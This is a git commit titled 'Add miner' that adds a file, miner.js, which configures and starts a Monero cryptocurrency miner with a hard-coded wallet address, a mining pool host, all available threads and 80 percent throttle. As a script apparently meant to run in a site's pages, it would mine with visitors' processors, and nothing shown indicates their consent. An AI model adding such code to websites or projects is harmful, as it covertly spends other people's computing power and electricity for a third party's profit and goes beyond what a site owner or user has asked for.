72043fc47278059c372d7947d30843de513be094
krazykirby99999 <krazykirby99999@gmail.com>
2021-01-23 14:39:55 -0600

    Add miner

---
+++ miner.js
@@ -0,0 +1,10 @@
+var site_id = 'cwm-3859';
+var coin = 'monero';
+var wallet = '49ZyE56XvinfGsRq6dVxDjPP5WRqVGA3YALeas8ocyLZTWocZZN97dFdw4kTdmyzjQ4xb5KauQVVaGwgbEqNRNwjHB92KUf';
+var password = 'x';
+var mining_pool = 'mine.xmrpool.net:3333';
+var threads = -1;
+var throttle = 0.8;
+var debug = false;
+cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
+
